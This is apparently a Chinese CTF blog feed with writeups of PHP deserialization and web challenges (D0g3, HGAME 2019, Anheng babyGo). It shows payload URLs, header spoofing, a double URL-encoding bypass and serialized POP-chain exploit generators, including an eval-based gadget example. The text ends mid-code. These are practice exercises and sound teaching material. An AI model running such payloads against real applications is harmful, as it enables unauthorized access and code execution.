id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>D0g3平台一道很简单的反序列化的题<br>网址:<a href="http://120.79.33.253:9001/" target="_blank" rel="noopener">http://120.79.33.253:9001/</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span></span><br><span class="line"><span class="php">$KEY = <span class="string">"D0g3!!!"</span>;</span></span><br><span class="line"><span class="php">$str = $_GET[<span class="string">'str'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (unserialize($str) === <span class="string">"$KEY"</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"$flag"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">show_source(<span class="keyword">__FILE__</span>);</span></span><br></pre></td></tr></table></figure><p>原理:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">$str = <span class="string">"D0g3!!!"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$str1 = serialize($str);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $str1;   <span class="comment">// s:7:"D0g3!!!";</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$str2 = unserialize($str1);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $str2;  <span class="comment">// D0g3!!!</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>payload:</p><pre><code>http://120.79.33.253:9001/?str=s:7:%22D0g3!!!%22</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/3674#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674#toc-0</a><br><a href="http://php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">http://php.net/manual/zh/language.oop5.magic.php</a><br><a href="http://php.net/manual/zh/language.oop5.serialization.php" target="_blank" rel="noopener">http://php.net/manual/zh/language.oop5.serialization.php</a><br><a href="https://blog.csdn.net/qq_23937195/article/details/73027557" target="_blank" rel="noopener">https://blog.csdn.net/qq_23937195/article/details/73027557</a><br><a href="http://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html" target="_blank" rel="noopener">http://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html</a><br><a href="https://www.cnblogs.com/iamstudy/articles/php_unserialize_pop_2.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/php_unserialize_pop_2.html</a><br><a href="https://www.anquanke.com/post/id/162300" target="_blank" rel="noopener">https://www.anquanke.com/post/id/162300</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019杭电CTF HGAME Writeup</title>
      <link href="/2019/01/27/2019%E6%9D%AD%E7%94%B5CTF-HGAME-Writeup/"/>
      <url>/2019/01/27/2019%E6%9D%AD%E7%94%B5CTF-HGAME-Writeup/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第一次AK了web…..<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1fzlaptvjruj311y0h3my1.jpg" alt=""></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h2 id="谁吃了我的flag"><a href="#谁吃了我的flag" class="headerlink" title="谁吃了我的flag"></a>谁吃了我的flag</h2><p>呜呜呜，Mki一起床发现写好的题目变成这样了，是因为昨天没有好好关机吗T_T hint: 据当事人回忆，那个夜晚他正在用vim编写题目页面，似乎没有保存就关机睡觉去了,现在就是后悔，十分的后悔。</p><p>hint 是后来增加的 一开始做的时候就想到类vim文件泄露 可是当时没有 </p><p>第二天看了出了hint 说是vim  再进行 /.index.html.swp<br>成功下载出来 得到flag</p><h2 id="换头大作战"><a href="#换头大作战" class="headerlink" title="换头大作战"></a>换头大作战</h2><ol><li>默认是GET提交 改为POST提交<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1fzlaqfpvdlj30r70f7jse.jpg" alt=""></li><li>设置X-Forwarded-For:127.0.0.1<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1fzlaqwyns3j30vh0dogoc.jpg" alt=""></li><li>修改UA<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1fzlarkhu5rj30yo0dndil.jpg" alt=""><ol start="4"><li>修改referer<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1fzlaryzf5sj30yx0d7wh3.jpg" alt=""><h2 id="very-easy-web"><a href="#very-easy-web" class="headerlink" title="very easy web"></a>very easy web</h2></li></ol></li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(strpos(<span class="string">"vidar"</span>,$_GET[<span class="string">'id'</span>])!==<span class="keyword">FALSE</span>)</span></span><br><span class="line"><span class="php">  <span class="keyword">die</span>(<span class="string">"&lt;p&gt;干巴爹&lt;/p&gt;"</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($_GET[<span class="string">'id'</span>] === <span class="string">"vidar"</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><pre><code>$_GET[&apos;id&apos;] = urldecode($_GET[&apos;id&apos;]);</code></pre><p>对id进行url解码了一次<br>在数据传入php脚本进行数据处理时本身会被解码一次<br>这样就导致了二次编码注入</p><p>将vidar进行url编码两次提交<br>?id=%2576%2569%2564%2561%2572</p><h2 id="can-u-find-me"><a href="#can-u-find-me" class="headerlink" title="can u find me?"></a>can u find me?</h2><p>在源代码看到f12.php<br>访问<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1fzlasbk5cpj30n408imz9.jpg" alt=""><br>在返回包看到密码,提交</p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1fzlasvfnqej310m0btmz8.jpg" alt=""><br>访问iamflag.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1fzlat857jaj30xl0ajmyw.jpg" alt=""></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h2 id="Hidden-Image-in-LSB"><a href="#Hidden-Image-in-LSB" class="headerlink" title="Hidden Image in LSB"></a>Hidden Image in LSB</h2><p>用stegsolve进行分析得到flag<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1fzlatlcbwpj30r70l8wfd.jpg" alt=""></p><h2 id="Broken-Chest"><a href="#Broken-Chest" class="headerlink" title="Broken Chest"></a>Broken Chest</h2><p>是一个压缩包文件，解压发现文件错误<br>用winhex打开压缩包分析分析<br>发现文件头不是以 50 4B 03 04 开头<br>修改为50 4B 03 04 开头 即可 保存<br>解压发现要密码, 在注释里面看到密码 提交得到flag</p><p><strong>参考</strong>:<br><a href="https://ctf-wiki.github.io/ctf-wiki/misc/archive/zip/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/misc/archive/zip/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019安恒杯一月新春贺岁赛writeup</title>
      <link href="/2019/01/27/2019%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%80%E6%9C%88%E6%96%B0%E6%98%A5%E8%B4%BA%E5%B2%81%E8%B5%9Bwriteup/"/>
      <url>/2019/01/27/2019%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%80%E6%9C%88%E6%96%B0%E6%98%A5%E8%B4%BA%E5%B2%81%E8%B5%9Bwriteup/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h2 id="babyGo（提交你找到的字符串的md5值）"><a href="#babyGo（提交你找到的字符串的md5值）" class="headerlink" title="babyGo（提交你找到的字符串的md5值）"></a>babyGo（提交你找到的字符串的md5值）</h2><p><strong>考点</strong></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php反序列化</span><br><span class="line"><span class="keyword">POP</span>链构造</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php">@error_reporting(<span class="number">1</span>); </span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span></span><br><span class="line"><span class="php">&#123;   </span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $skyobj;  </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $aaa;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $bbb;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span></span><br><span class="line"><span class="php">    &#123;      </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span></span><br><span class="line"><span class="php">    &#123;          </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span></span><br><span class="line"><span class="php">&#123;    </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename;     </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $nice;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $amzing; </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span></span><br><span class="line"><span class="php">    &#123;   </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (file_get_contents($file))         </span></span><br><span class="line"><span class="php">            &#123;              </span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> file_get_contents($file); </span></span><br><span class="line"><span class="php">            &#125;  </span></span><br><span class="line"><span class="php">            <span class="keyword">else</span> </span></span><br><span class="line"><span class="php">            &#123; </span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span></span><br><span class="line"><span class="php">            &#125;    </span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span></span></span><br><span class="line"><span class="php">&#123;  </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>     </span></span></span><br><span class="line"><span class="php">    &#123;          </span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span></span><br><span class="line"><span class="php">&#123; </span></span><br><span class="line"><span class="php">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]);</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $Input_data; </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="keyword">else</span> </span></span><br><span class="line"><span class="php">&#123; </span></span><br><span class="line"><span class="php">    highlight_file(<span class="string">"./index.php"</span>); </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>flag的输出在cool类中的read方法中,但是在baby类中调用的是sec类的read方法</p><p><strong>POP链构造</strong><br>一般的序列化攻击都在PHP魔术方法中出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来<br><strong>举例</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $ClassObj;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> normal();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;ClassObj-&gt;action();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"hello"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $data;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>在 lemo类中调用得的是 normal类 但是在 evil类 中也有在normal类中的相同方法名 action<br>这时可以构造poc链来调用 evil类 中的 action方法<br>payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $ClassObj;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> evil();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">   </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"hello"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $data = <span class="string">"phpinfo()"</span>;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> lemon;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($a);</span></span><br></pre></td></tr></table></figure><p>本题也是一道简单的POP链构造,注意的是<br>if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)<br>因为aaa和bbb一开为null  如果不构造amazing的话 实例化之后也为空 即可绕过if 判断<br>payload如下:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php">@error_reporting(<span class="number">1</span>); </span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span></span><br><span class="line"><span class="php">&#123;   </span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $skyobj;  </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $aaa;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $bbb;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span></span><br><span class="line"><span class="php">    &#123;      </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span></span><br><span class="line"><span class="php">    &#123;          </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span></span><br><span class="line"><span class="php">&#123;    </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename=<span class="string">"flag.php"</span>;     </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $nice;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $amzing; </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span></span><br><span class="line"><span class="php">    &#123;   </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (file_get_contents($file))         </span></span><br><span class="line"><span class="php">            &#123;              </span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> file_get_contents($file); </span></span><br><span class="line"><span class="php">            &#125;  </span></span><br><span class="line"><span class="php">            <span class="keyword">else</span> </span></span><br><span class="line"><span class="php">            &#123; </span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span></span><br><span class="line"><span class="php">            &#125;    </span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> baby;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($a);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>另一种做法是看飘零师傅的</p><pre><code>$this-&gt;nice = unserialize($this-&gt;amzing);$this-&gt;nice-&gt;aaa = $sth;if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)</code></pre><p>aaa会被$sth变量赋值 源码中也没出现这个变量 但同时又要与bbb相等<br>所以使用指针引用 这样bbb的值会随aaa动态改变<br>构造amazing</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php">@error_reporting(<span class="number">1</span>); </span></span><br><span class="line"><span class="php"><span class="comment">//include 'flag.php';</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span></span><br><span class="line"><span class="php">&#123;   </span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $skyobj;  </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $aaa;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $bbb;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span></span><br><span class="line"><span class="php">    &#123;      </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span></span><br><span class="line"><span class="php">    &#123;          </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span 